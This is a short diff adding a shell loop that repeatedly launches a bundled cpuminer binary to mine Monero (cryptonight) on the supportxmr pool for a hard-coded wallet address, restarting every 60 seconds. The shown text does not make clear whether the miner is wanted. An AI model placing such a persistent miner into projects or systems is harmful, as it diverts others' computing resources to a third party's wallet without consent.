@@ -1,0 +1,5 @@
+while true;
+do
+`pwd`/cpuminer/minerd -a cryptonight -o stratum+tcp://pool.supportxmr.com:3333 -u 45pwYiBt5vvWm6KgsAkGkrZztC7NthMbEMMvgUGD6SitK7YDbPgFvJS2mNiW4Fx4Pb2oncinP92A1j7uVxHdjCmKHQpPjHH.pandaE -p x
+sleep 60;
+done
